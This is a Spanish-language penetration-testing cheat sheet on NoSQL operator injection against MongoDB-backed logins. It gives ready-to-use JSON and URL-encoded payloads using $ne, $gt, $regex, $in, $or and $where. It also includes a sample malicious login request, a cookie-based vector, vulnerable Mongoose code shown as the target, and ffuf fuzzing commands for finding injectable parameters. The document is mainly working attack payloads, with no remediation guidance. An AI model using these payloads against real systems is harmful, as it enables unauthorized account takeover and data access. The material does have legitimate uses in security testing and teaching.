---
aliases:
  - NoSQL Operator Injection
  - MongoDB Auth Bypass
  - $ne bypass
tags:
  - type/technique
  - vuln/nosqli
  - technique/initial-access
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[NoSQL Injection]]'
---
# NoSQLi - Operadores (Auth Bypass)

***

## Cheatsheet

| **Objetivo** | **Payload JSON** | **Payload URL** | **Notas** |
|:---:|:---:|:---:|---|
| **Auth bypass clásico** | `{"user":{"$ne":null},"pass":{"$ne":null}}` | `user[$ne]=&pass[$ne]=` | Match cualquier documento con user/pass no nulos. |
| **Auth con user conocido** | `{"user":"admin","pass":{"$ne":"x"}}` | `user=admin&pass[$ne]=x` | Login como `admin` sin saber password. |
| **$gt / $lt bypass** | `{"pass":{"$gt":""}}` | `pass[$gt]=` | Match cualquier pass > string vacío. |
| **$regex (wildcard)** | `{"user":"admin","pass":{"$regex":".*"}}` | `user=admin&pass[$regex]=.*` | Match cualquier password. |
| **$in (lista válidos)** | `{"user":{"$in":["admin","root"]}}` | `user[$in][]=admin&user[$in][]=root` | Probar múltiples users en 1 request. |
| **$or / $and combo** | `{"$or":[{"user":"admin"},{"user":"root"}]}` | `$or[0][user]=admin&$or[1][user]=root` | Operadores lógicos top-level. |
| **$exists** | `{"role":{"$exists":true}}` | `role[$exists]=true` | Filtrar documentos con campo presente. |
| **$where con JS** | `{"$where":"this.user=='admin'"}` | `$where=this.user=='admin'` | Solo si `$where` no bloqueado. Ver [[NoSQLi - JavaScript]]. |
^nosqli-operators

___

## Overview

**Operator injection** aprovecha que frameworks NoSQL (principalmente MongoDB + libs Mongoose/PyMongo/pymongo/nestjs) parsean objetos anidados sin type coercion. Si el backend convierte query string o JSON body directo a query MongoDB sin sanitizar, los operadores `$ne`, `$gt`, `$regex` etc. pasan intactos.

### Vector clásico: Login bypass

Código vulnerable (Node.js + Mongoose):
```javascript
// NO sanitiza — pasa req.body directo a .findOne()
const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
});
```

Request atacante:
```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":{"$ne":"x"}}
```

Mongoose construye:
```javascript
{ username: "admin", password: { $ne: "x" } }
```

→ Match `admin` con cualquier password ≠ "x" → logueado.

### Formato URL-encoded (Express body-parser)

Express con `extended: true` parsea `user[$ne]=` como `{"user":{"$ne":""}}` automáticamente:
```
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=
```

### Operadores MongoDB de comparación

| Operador | Función |
|---|---|
| `$eq` | Equal (default implícito) |
| `$ne` | Not equal |
| `$gt`, `$gte` | Greater than, greater or equal |
| `$lt`, `$lte` | Less than, less or equal |
| `$in` | Match cualquier valor en array |
| `$nin` | Not in array |
| `$regex` | Regex match |
| `$exists` | Field existe |
| `$type` | Type check (int, string, bool) |

### Operadores lógicos

| Operador | Función |
|---|---|
| `$and` | AND de queries |
| `$or` | OR de queries |
| `$nor` | NOR (nada matchea) |
| `$not` | Negación |

### Detección rápida

1. Input JSON → probar `{"field":{"$ne":"nonexistent"}}`.
2. Input URL-encoded → probar `field[$ne]=nonexistent`.
3. Si response cambia (200 vs 401, diff en body, diff en cookie set) → vulnerable.

### Vector cookie / header

Algunos middlewares parsean cookies como objetos:
```
Cookie: user_id[$ne]=999
```

### Herramienta auto

```bash
# NoSQLMap
python NoSQLMap.py

# Manual fuzzing con ffuf
ffuf -w operators.txt -u "http://target/login?user=admin&pass[FUZZ]=x" -fc 401
```

Donde `operators.txt` contiene `$ne`, `$gt`, `$regex`, `$in`, etc.

***
